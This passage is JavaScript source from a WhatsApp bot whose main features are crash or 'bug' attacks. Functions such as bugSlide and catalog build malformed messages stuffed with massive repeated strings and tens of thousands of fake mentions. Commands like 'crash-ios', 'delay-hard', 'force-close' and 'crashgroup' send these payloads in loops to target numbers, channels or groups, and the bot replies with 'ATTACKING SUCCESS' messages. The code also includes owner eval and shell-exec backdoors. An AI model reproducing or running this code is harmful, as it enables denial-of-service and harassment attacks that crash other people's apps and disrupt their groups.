                    height: 1,
                    width: 1,
                    mediaKey: "AgAAAAAAAAAAAAAAAAAAAAA=",
                    fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    mediaKeyTimestamp: "999999999",
                    fileLength: "999999",
                    directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
                    jpegThumbnail: Buffer.from("00", "hex"),
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: " ".repeat(5000)
                },
                footer: {
                  text: "carousel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(99999)
                }
              }
            ]
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9999)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      crash: "{ xx.com }".repeat(9999)
                    }),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});

  await bot.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}      
          
            
//==================================================//      
async function bugSlide(client, target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "🌹 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃" + " ".repeat(10000)
          },
          footer: {
            text: ""
          },
          carouselMessage: {
            cards: [
              {
                header: {
                  title: "🌹 𝐑͠𝐢̻𝐳͢𝐱ͯ𝐕̻𝐞͜𝐥̻𝐳͡ 𝐎͠𝐟̻𝐟͢𝐢͜𝐜ͯ𝐢̻𝐚̻𝐥-𝐈ͯ𝐃",
                  imageMessage: {
                    mimetype: "image/jpeg",
                    height: 1,
                    width: 1,
                    mediaKey: "AgAAAAAAAAAAAAAAAAAAAAA=",
                    fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    mediaKeyTimestamp: "999999999",
                    fileLength: "999999",
                    directPath: "/v/t62.7118-24/11734305_enc.jpg?ccb=11-4",
                    jpegThumbnail: Buffer.from("00", "hex"),
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: " ".repeat(5000)
                },
                footer: {
                  text: "carousel.json"
                },
                nativeFlowMessage: {
                  messageParamsJson: "\n".repeat(99999)
                }
              }
            ]
          },
          nativeFlowMessage: {
            messageParamsJson: "\n".repeat(9999)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          remoteJid: "@s.whatsapp.net",
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: JSON.stringify({
                      crash: "{ xx.com }".repeat(9999)
                    }),
                    version: 3
                  }
                }
              }
            }
          }
        }
      }
    }
  }, {});

  await bot.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  });
}
        
        
                            

    
            
  
          
           
//==================================================//  
        //(Function catalog delay)//   
  async function catalog(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "Q/adIgjaY3KiV8DkDQTo7521m0Zt2SYRbUAYr0WKIzU=",
fileLength: "999999999",
seconds: 9999,
mediaKey: "4nHO5QO3iSFHukSO+Rh9HRw0iadQ4gpggWmPCIAjVs4=",
caption: "愛? || ⏤͟𝗭𝗰𝗿𝗮𝘀𝗵͟͞͞",
height: 9999,
width: 9999,
fileEncSha256: "zeRhIzoqguVqfHibNdNW5ygXfYWEW8xWaFLzwkhIZ6w=",
directPath: "/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0",
mediaKeyTimestamp: "1744433512",
jpegThumbnail: null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
},
annotations: [{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "777",
songId: "777",
author: "Zcrash ||",
title: " Kagenou",
artistAttribution: "https://www.github.com/kagenouReal",
countryBlocklist: true,
isExplicit: true
}
},
embeddedAction: null
}]}}}}, {});
await bot.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]}]}]});
console.log("🧊 Success Send Stresszerv2 To Target")
}
}
//==================================================//      
    case 'crashch':
case 'crash-infinite': {
    if (!Owner) return ReplyMultiMenu2("*You are not a Premium User*");
    if (!q) return ReplyMultiMenu2("example: 120363xxxxxxx")

    if (!/^\d{15,}$/.test(q)) return ReplyMultiMenu2("❌ Channel ID must be valid (120363xxxxxxx)");

    let target = `${q}@newsletter`;

    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`

𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${target}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`;
    ReplyMultiMenu2(teks);
    ////////// Sending Bugs //////////
    for (let i = 0; i < 1; i++) {
    console.log(chalk.green(`© CrashApp : ${i}/1
target : ${target}`));
    await ChannelCrash1(bot, target);
    await ChannelCrash2(bot, target);
    await ChannelCrash3(bot, target);
    }
    ////////// Succes Bugs //////////
}
break 
//==================================================//    
        case 'invis-hard': {
if (!Owner && !isPremium ) return ReplyMultiMenu2(mess.premium);
if (!q) return ReplyMultiMenu2("example:254xxx or tag @user")

let mentionedJid;
if (m.mentionedJid?.length > 0) {
mentionedJid = m.mentionedJid[0];
} else {
let jidx = q.replace(/[^0-9]/g, "");
if (jidx.startsWith('0')) return ReplyMultiMenu2MultiMenu2("example:254xxx")
mentionedJid = `${jidx}@s.whatsapp.net`;
lockNum = `${jidx}`;
}
let target = mentionedJid;
let lock = lockNum;
let teks = `「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 :  *${command}*`
ReplyMultiMenu2(teks)

for (let i = 0; i < 10; i++) {
console.log(chalk.green(`© Wise-Bots - Invisible
𖥂 Bulldozer : ${i}/400
𖥂 Target : ${target}`));
await Cursor(bot, target);
await Cursor(bot, target);
}
}
break
//==================================================//            
        case 'delay-hard': {
  try {
    if (!Owner) return ReplyMultiMenu2(mess.premium);
    if (!q) return ReplyMultiMenu2("example:254xxx or tag @user")

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyMultiMenu2("example: 254xxx")
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyMultiMenu2(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 1000; i++) {
console.log(chalk.green(`© delay : ${i}/1000
target : ${target}`));
await protocolbug7(bot, target)
await protocolbug7(bot, target)   
   
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyMultiMenu2("Failed to send virus. Make sure the number is valid.");
}
}
break
//==================================================//                
case 'crash-ios': {
  try {
    if (!Owner) return ReplyMultiMenu2(mess.premium);
    if (!q) return ReplyMultiMenu2("example:254xxx or tag @user")

    let mentionedJid;
    if (m.mentionedJid?.length > 0) {
        mentionedJid = m.mentionedJid[0];
    } else {
        let jidx = q.replace(/[^0-9]/g, "");
        if (jidx.startsWith('0')) return ReplyMultiMenu2("Example: 254xxx")
        mentionedJid = `${jidx}@s.whatsapp.net`;
        lockNum = `${jidx}`;
    }

    let target = mentionedJid;
    let lock = lockNum;
    let teks = `\`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\`
    
𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : *${lock}*
𖥂 𝐕𝐈𝐑𝐔𝐒 : *${command}*`
ReplyMultiMenu2(teks)
////////// Sending Bugs //////////
for (let i = 0; i < 50; i++) {
console.log(chalk.green(`© CrashIoS : ${i}/50
target : ${target}`));
await NewStellarStuck(bot, target);
await CrashIOS(bot, target);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyMultiMenu2("Failed to send virus. Make sure the number is valid.");
}
}
break
//==================================================//           
  case "crash-null":
  case "force-close": {
if (!Owner) return reply(mess.owner)
if (!q) return ReplyMultiMenu2(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`)
    
let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')
let isTarget = client + "@s.whatsapp.net"
await bot.sendMessage(m.chat, { react: { text: '🔍', key: m.key } });
  let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Process.....
`
await bot.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyMultiMenu2(process) 
for (let r = 0; r < 50; r++) {
await bugSlide(isTarget);
await sleep(5000)
await bugSlide(isTarget);
await bugSlide(isTarget);
await sleep(5000)
await bugSlide(isTarget);
}

let put = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : Success
`
await bot.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
ReplyMultiMenu2(put)
}
break             
//==================================================//      
        case 'blank-group': {
    if (!Owner) return ReplyMultiMenu2("This Feature Only Send By Bot Number");
if (!m?.isGroup) return reply(mess.group)
    bot.sendMessage(m.chat, { react: { text: '🩸', key: m.key } });
    
    //Paramater
    for (let r = 0; r < 15; r++) {
        

    await StallerPackFreze(m.chat);
await invico2(m.chat);
await letterCrash(m.chat);
await StickerPack6(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
            ReplyMultiMenu2(`[ ؆ ]𝐀𝐋𝐋 𝐌𝐄𝐌𝐁𝐄𝐑𝐒 𝐃𝐎𝐖𝐍
 _*\`Status\`*_ : *SUCCESS  ATTACK ✅*
 _*\`Type\`*_ : _${command}_
>  ⚠️ WARNING ⚠️


> 𝐏𝐚𝐮𝐬𝐞 𝐟𝐢𝐯𝐞 𝐦𝐢𝐧𝐮𝐭𝐞𝐬 𝐬𝐨 𝐭𝐡𝐚𝐭 𝐛𝐨𝐭 𝐢𝐬 𝐧𝐨𝐭 𝐛𝐚𝐧𝐧𝐞𝐝`)   
}
break; 
//==================================================//                
        case 'frezegrup':
case 'crashgroup': {
  if (!Owner) return reply(mess.owner);
  if (!q) return ReplyMultiMenu2("example: https://chat.whatsapp.com/");

  try {
    await sleep(1000);
    ReplyMultiMenu2(`Bot successfully sends a virus message`);

    let result = args[0].split("https://chat.whatsapp.com/")[1];
    let target = await bot.groupAcceptInvite(result);

////////// Sending Bugs //////////
for (let i = 0; i < 1; i++) {
console.log(chalk.green(`© FrezeGrup : ${i}/1
target : ${target}`));
await StallerPackFreze(bot, target);
await invico2(bot, target);
await letterCrash(bot, target);
await StickerPack6(bot, target);
}
////////// Succes Bugs //////////
  } catch (err) {
    console.error(err);
    ReplyMultiMenu2("Failed to send virus. Make sure the number or link is valid.");
  }
}
break
//==================================================//             
        case 'mentions': {
  async function StatusMent(from = false) {
    const imageMessage = {
      "url": `${url}`,
      "mimetype": "image/jpeg",
      "fileSha256": `${fileSha256}`,
      "fileLength": "1",
      "height": 2000,
      "width": 2000,
      "mediaKey": `${mediaKey}`,
      "fileEncSha256": `${fileEncSha256}`,
      "directPath": `${directPath}`,
      "jpegThumbnail": `${jpegThumbnail}`,
      "caption":"Hi",
      "contextInfo": {
        "forwardedNewsletterMessageInfo": {
          "newsletterJid": '120363401104706570@newsletter',
          "severMessageId": "743743743",
          "newsletterName": `𝐖𝐢𝐬𝐞-𝐀𝐥-𝐕𝟐`,
          "contentType": "LINK_CARD"
        },
        "forwardingScore": 127,
        "isForwarded": true
      }
    };
    const msg1 = generateWAMessageFromContent(from, {
      "viewOnceMessage": { "message": { imageMessage } }
    }, {});
    if (!msg1.key) {
      msg1.key = { id: generateMessageID() };
    }
    await bot.relayMessage("status@broadcast", msg1.message, {
      "messageId": msg1.key.id,
      "statusJidList": [from],
      "additionalNodes": [{
        "tag": "meta",
        "attrs": {},
        "content": [{
          "tag": "mentioned_users",
          "attrs": {},
          "content": [{
            "tag": "to",
            "attrs": { jid: from },
            "content": undefined
          }]
        }]
      }]
    });
    await bot.relayMessage(from, {
      "statusMentionMessage": {
        "message": {
          "protocolMessage": {
            "key": msg1.key,
            "type": 25
          }
        }
      }
    },
    {
      "additionalNodes": [{
        "tag": "meta",
        "attrs": { "is_status_mention": "true" },
        "content": undefined
      }]
    });
  }
  StatusMent(from);
}
break;
//==================================================//                
        case "enhancer":
            case "unblur":
            case "enhance":
            case "hdr":
            case "hd":
            case "remini": {
                bot.enhancer = bot.enhancer ? bot.enhancer : {};
                if (m.sender in bot.enhancer) return reply(`\nprovide a query to be processed\n`)
                let q = m.quoted ? m.quoted : m;
                let mime = (q.msg || q).mimetype || q.mediaType || "";
                if (!mime) return reply(`\nimage reply, with the caption ${prefix + command}\n`)
                if (!/image\/(jpe?g|png)/.test(mime)) return reply(`mime ${mime} that is supported`)
                else bot.enhancer[m.sender] = true;
            
                let img = await q.download?.();
                let error;
                try {
                    const This = await remini(img, "enhance");
                                     bot.sendFile(m.chat, This, "", "```success...```", m);
                } catch (er) {
                    error = true;
                } finally {
                    if (error) {
                        reply(m.chat, "proses failed :(", m)
                    }
                    delete bot.enhancer[m.sender];
                }
            }
                break;
//==================================================//        
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
let koi = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await bot.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break
//==================================================//
default:       
if (budy.startsWith('<')) {
if (!Owner) return;
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return ReplyMultiMenu2(bang)}
try {
ReplyMultiMenu2(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
ReplyMultiMenu2(String(e))}}
if (budy.startsWith('>')) {
if (!Owner) return;
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await ReplyMultiMenu2(evaled)
} catch (err) {
await ReplyMultiMenu2(String(err))
}
}
if (budy.startsWith('$')) {
if (!Owner) return;
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return ReplyMultiMenu2(`${err}`)
if (stdout) return ReplyMultiMenu2(stdout)
})
}
}
} catch (err) {
console.log(require("util").format(err));
}
}
let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})



